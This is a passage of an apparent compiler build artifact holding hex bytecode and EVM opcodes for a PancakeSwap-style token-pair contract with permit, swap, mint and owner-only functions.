05161172f92849287926116c392600160701b90046001600160701b0316916001600160a01b038616916370a0823191602480820192602092909190829003018186803b15801561168b57600080fd5b5050600160105550565b6007546001600160a01b031681565b6009546001600160a01b031681565b4284101561179f576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa1580156118ba573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906118f05750886001600160a01b0316816001600160a01b0316145b611941576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b61194c898989612139565b505050505050505050565b60006010546001146119a2576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b60006010819055806119b2610c9d565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b158015611a0657600080fd5b505afa158015611a1a573d6000803e3d6000fd5b505050506040513d6020811015611a3057600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015611a8357600080fd5b505afa158015611a97573d6000803e3d6000fd5b505050506040513d6020811015611aad57600080fd5b505190506000611acc836001600160701b03871663ffffffff611f2616565b90506000611ae9836001600160701b03871663ffffffff611f2616565b90506000611af78787612243565b60005490915080611b3057611b1b6103e8610b60611075878763ffffffff611ec316565b9850611b2a60006103e8612530565b50611b50565b611b4d6001600160701b0389166110ab868463ffffffff611ec316565b98505b60008911611b8f5760405162461bcd60e51b81526004018080602001828103825260288152602001806126e06028913960400191505060405180910390fd5b611b998a8a612530565b5061113286868a8a611f76565b600260209081526000928352604080842090915290825290205481565b600a5481565b601054600114611c12576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601055600854604080516370a0823160e01b81523060048201529051611d22926001600160a01b0316916370a08231916024808301926020929190829003018186803b158015611c6357600080fd5b505afa158015611c77573d6000803e3d6000fd5b505050506040513d6020811015611c8d57600080fd5b5051600954604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015611cda57600080fd5b505afa158015611cee573d6000803e3d6000fd5b505050506040513d6020811015611d0457600080fd5b5051600b546001600160701b0380821691600160701b900416611f76565b6001601055565b604080518082018252601981527f7472616e7366657228616464726573732c75696e74323536290000000000000060209182015281516001600160a01b0385811660248301526044808301869052845180840390910181526064909201845291810180516001600160e01b031663a9059cbb60e01b1781529251815160009460609489169392918291908083835b60208310611dd65780518252601f199092019160209182019101611db7565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114611e38576040519150601f19603f3d011682016040523d82523d6000602084013e611e3d565b606091505b5091509150818015611e6b575080511580611e6b5750808060200190516020811015611e6857600080fd5b50515b611ebc576040805162461bcd60e51b815260206004820152601860248201527f50616e63616b653a205452414e534645525f4641494c45440000000000000000604482015290519081900360640190fd5b5050505050565b6000811580611ede57505080820282828281611edb57fe5b04145b610cd8576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6d756c2d6f766572666c6f7760601b604482015290519081900360640190fd5b80820382811115610cd8576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160701b038411801590611f9457506001600160701b038311155b611fd9576040805162461bcd60e51b815260206004820152601160248201527050616e63616b653a204f564552464c4f5760781b604482015290519081900360640190fd5b600b5463ffffffff42811691600160e01b9004811682039081161580159061200957506001600160701b03841615155b801561201d57506001600160701b03831615155b1561208e578063ffffffff1661204b8561203686612616565b6001600160e01b03169063ffffffff61262816565b600c80546001600160e01b03929092169290920201905563ffffffff81166120768461203687612616565b600d80546001600160e01b0392909216929092020190555b600b80546dffffffffffffffffffffffffffff19166001600160701b03888116919091176dffffffffffffffffffffffffffff60701b1916600160701b8883168102919091176001600160e01b0316600160e01b63ffffffff871602179283905560408051848416815291909304909116602082015281517f1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1929181900390910190a1505050505050565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b0383166000908152600160205260409020546121c4908263ffffffff611f2616565b6001600160a01b0380851660009081526001602052604080822093909355908416815220546121f9908263ffffffff61264d16565b6001600160a01b03808416600081815260016020908152604091829020949094558051858152905191939287169260008051602061272e83398151915292918290030190a3505050565b600080600760009054906101000a90046001600160a01b03166001600160a01b031663017e7e586040518163ffffffff1660e01b815260040160206040518083038186803b15801561229457600080fd5b505afa1580156122a8573d6000803e3d6000fd5b505050506040513d60208110156122be57600080fd5b5051600e546001600160a01b0382161580159450919250906123a257801561239d5760006123016110756001600160701b0388811690881663ffffffff611ec316565b9050600061230e836123b6565b90508082111561239a5760006123416008610baa612332868663ffffffff611f2616565b6000549063ffffffff611ec316565b9050600061237661235984600863ffffffff611ec316565b61236a86601163ffffffff611ec316565b9063ffffffff61264d16565b9050600081838161238357fe5b0490508015612396576123968782612408565b5050505b50505b6123ae565b80156123ae576000600e555b505092915050565b600060038211156123f9575080600160028204015b818110156123f3578091506002818285816123e257fe5b0401816123eb57fe5b0490506123cb565b50612403565b8115612403575060015b919050565b60005461241b908263ffffffff61264d16565b60009081556001600160a01b038316815260016020526040902054612446908263ffffffff61264d16565b6001600160a01b038316600081815260016020908152604080832094909455835185815293519293919260008051602061272e8339815191529281900390910190a35050565b600081831061249b578161249d565b825b9392505050565b6001600160a01b0382166000908152600160205260409020546124cd908263ffffffff611f2616565b6001600160a01b038316600090815260016020526040812091909155546124fa908263ffffffff611f2616565b60009081556040805183815290516001600160a01b0385169160008051602061272e833981519152919081900360200190a35050565b60006001600160a01b03831661258d576040805162461bcd60e51b815260206004820152601f60248201527f42455032303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b6000546125a0908363ffffffff61264d16565b60009081556001600160a01b0384168152600360205260409020546125cb908363ffffffff61264d16565b6001600160a01b038416600081815260036020908152604080832094909455835186815293519293919260008051602061272e8339815191529281900390910190a350600192915050565b6001600160701b0316600160701b0290565b60006001600160701b0382166001600160e01b0384168161264557fe5b049392505050565b80820182811015610cd8576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfe4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6e50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e54454450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e5450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544a265627a7a72315820cf9089f787db5c2a6ca32ebe2dc67686be59ff857f8ac479e4a2edbca7aaf7c464736f6c63430005100032454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x6 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH20 0x9E94EE69F3CDCD5E74E05563736E4679DA6DB44C OR SWAP1 SSTORE PUSH1 0x1 PUSH1 0x10 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x3B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD CHAINID SWAP1 DUP1 PUSH1 0x52 PUSH2 0x2901 DUP3 CODECOPY PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB PUSH1 0x52 ADD DUP3 KECCAK256 DUP3 DUP3 ADD DUP3 MSTORE PUSH1 0x7 DUP1 DUP5 MSTORE PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL PUSH1 0x20 SWAP5 DUP6 ADD MSTORE DUP3 MLOAD DUP1 DUP5 ADD DUP5 MSTORE PUSH1 0x1 DUP2 MSTORE PUSH1 0x31 PUSH1 0xF8 SHL SWAP1 DUP6 ADD MSTORE DUP3 MLOAD DUP1 DUP6 ADD SWAP3 SWAP1 SWAP3 MSTORE PUSH32 0x6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE DUP3 DUP5 ADD MSTORE PUSH32 0xC89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6 PUSH1 0x60 DUP4 ADD MSTORE PUSH1 0x80 DUP3 ADD SWAP6 SWAP1 SWAP6 MSTORE ADDRESS PUSH1 0xA0 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP3 MLOAD DUP1 DUP4 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xC0 SWAP1 SWAP2 ADD SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 ADD KECCAK256 PUSH1 0x4 SSTORE POP DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP1 DUP2 AND CALLER SWAP1 DUP2 OR SWAP1 SWAP3 SSTORE PUSH1 0xF DUP1 SLOAD SWAP1 SWAP2 AND SWAP1 SWAP2 OR SWAP1 SSTORE PUSH2 0x27CB DUP1 PUSH2 0x136 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1FB JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x11A JUMPI DUP1 PUSH4 0xBA9A7A56 GT PUSH2 0xAD JUMPI DUP1 PUSH4 0xD505ACCF GT PUSH2 0x7C JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x5E9 JUMPI DUP1 PUSH4 0xDCBBB373 EQ PUSH2 0x63A JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x660 JUMPI DUP1 PUSH4 0xF317739C EQ PUSH2 0x68E JUMPI DUP1 PUSH4 0xFFF6CAE9 EQ PUSH2 0x696 JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0xBA9A7A56 EQ PUSH2 0x5AB JUMPI DUP1 PUSH4 0xBC25CF77 EQ PUSH2 0x5B3 JUMPI DUP1 PUSH4 0xC45A0155 EQ PUSH2 0x5D9 JUMPI DUP1 PUSH4 0xD21220A7 EQ PUSH2 0x5E1 JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x8DA5CB5B GT PUSH2 0xE9 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x567 JUMPI DUP1 PUSH4 0x900820D8 EQ PUSH2 0x56F JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x577 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x57F JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x4D4 JUMPI DUP1 PUSH4 0x7464FC3D EQ PUSH2 0x4FA JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x502 JUMPI DUP1 PUSH4 0x89AFCB44 EQ PUSH2 0x528 JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x30ADF81F GT PUSH2 0x192 JUMPI DUP1 PUSH4 0x5909C0D5 GT PUSH2 0x161 JUMPI DUP1 PUSH4 0x5909C0D5 EQ PUSH2 0x481 JUMPI DUP1 PUSH4 0x5A3D5493 EQ PUSH2 0x489 JUMPI DUP1 PUSH4 0x6488F7B0 EQ PUSH2 0x491 JUMPI DUP1 PUSH4 0x6A627842 EQ PUSH2 0x4AE JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x42D JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x435 JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x453 JUMPI DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x45B JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0xDFE1681 GT PUSH2 0x1CE JUMPI DUP1 PUSH4 0xDFE1681 EQ PUSH2 0x383 JUMPI DUP1 PUSH4 0x1794BB3C EQ PUSH2 0x3A7 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x3DD JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x3F7 JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x22C0D9F EQ PUSH2 0x200 JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x28E JUMPI DUP1 PUSH4 0x902F1AC EQ PUSH2 0x30B JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x343 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x80 DUP2 LT ISZERO PUSH2 0x216 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH1 0x40 DUP4 ADD CALLDATALOAD AND SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH1 0x80 DUP2 ADD PUSH1 0x60 DUP3 ADD CALLDATALOAD PUSH5 0x100000000 DUP2 GT ISZERO PUSH2 0x24D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 ADD DUP4 PUSH1 0x20 DUP3 ADD GT ISZERO PUSH2 0x25F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP2 DUP5 PUSH1 0x1 DUP4 MUL DUP5 ADD GT PUSH5 0x100000000 DUP4 GT OR ISZERO PUSH2 0x281 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SWAP1 SWAP3 POP SWAP1 POP PUSH2 0x69E JUMP JUMPDEST STOP JUMPDEST PUSH2 0x296 PUSH2 0xC7A JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2D0 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x2B8 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x2FD JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x313 PUSH2 0xC9D JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP5 DUP6 AND DUP2 MSTORE SWAP3 SWAP1 SWAP4 AND PUSH1 0x20 DUP4 ADD MSTORE PUSH4 0xFFFFFFFF AND DUP2 DUP4 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 RETURN JUMPDEST PUSH2 0x36F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x359 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0xCC7 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x38B PUSH2 0xCDE JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3BD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xCED JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0xD76 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x36F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x40D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xD7C JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0xE16 JUMP JUMPDEST PUSH2 0x43D PUSH2 0xE3A JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x3E5 PUSH2 0xE3F JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x471 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xE45 JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0xE57 JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0xE5D JUMP JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH2 0xE63 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xEB1 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4EA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x11AF JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0x11C1 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x518 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x11C7 JUMP JUMPDEST PUSH2 0x54E PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x53E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x11D9 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB ADD SWAP1 RETURN JUMPDEST PUSH2 0x38B PUSH2 0x157D JUMP JUMPDEST PUSH2 0x38B PUSH2 0x158C JUMP JUMPDEST PUSH2 0x296 PUSH2 0x159B JUMP JUMPDEST PUSH2 0x36F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x595 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x15BD JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0x15CA JUMP JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x5C9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x15D0 JUMP JUMPDEST PUSH2 0x38B PUSH2 0x1739 JUMP JUMPDEST PUSH2 0x38B PUSH2 0x1748 JUMP JUMPDEST PUSH2 0x28C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x5FF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x1757 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x650 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1957 JUMP JUMPDEST PUSH2 0x3E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x676 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x1BA6 JUMP JUMPDEST PUSH2 0x3E5 PUSH2 0x1BC3 JUMP JUMPDEST PUSH2 0x28C PUSH2 0x1BC9 JUMP JUMPDEST PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x6E7 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 SSTORE DUP5 ISZERO ISZERO DUP1 PUSH2 0x6FA JUMPI POP PUSH1 0x0 DUP5 GT JUMPDEST PUSH2 0x735 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x274E PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x740 PUSH2 0xC9D JUMP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP8 LT DUP1 ISZERO PUSH2 0x765 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP7 LT JUMPDEST PUSH2 0x7B6 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E53554646494349454E545F4C495155494449545900 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x64 PUSH1 0xA SLOAD DUP12 MUL DUP2 PUSH2 0x7C9 JUMPI INVALID JUMPDEST DIV DUP11 SUB SWAP1 POP PUSH1 0x0 PUSH1 0x64 PUSH1 0xA SLOAD DUP12 MUL DUP2 PUSH2 0x7DE JUMPI INVALID JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD SWAP3 SWAP1 SWAP2 DIV DUP13 SUB SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND SWAP2 DUP2 AND SWAP1 DUP12 AND DUP3 EQ DUP1 ISZERO SWAP1 PUSH2 0x81E JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP12 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ ISZERO JUMPDEST PUSH2 0x865 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x13 PUSH1 0x24 DUP3 ADD MSTORE PUSH19 0x50616E63616B653A20494E56414C49445F544F PUSH1 0x68 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP13 ISZERO PUSH2 0x876 JUMPI PUSH2 0x876 DUP3 DUP13 DUP7 PUSH2 0x1D29 JUMP JUMPDEST DUP12 ISZERO PUSH2 0x887 JUMPI PUSH2 0x887 DUP2 DUP13 DUP6 PUSH2 0x1D29 JUMP JUMPDEST DUP9 ISZERO PUSH2 0x942 JUMPI DUP11 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x84800812 CALLER DUP7 DUP7 DUP15 DUP15 PUSH1 0x40 MLOAD DUP7 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE PUSH1 0x20 ADD DUP6 DUP2 MSTORE PUSH1 0x20 ADD DUP5 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP5 DUP5 DUP3 DUP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP DUP1 DUP3 DUP5 CALLDATACOPY PUSH1 0x0 DUP2 DUP5 ADD MSTORE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND SWAP1 POP DUP1 DUP4 ADD SWAP3 POP POP POP SWAP7 POP POP POP POP POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x929 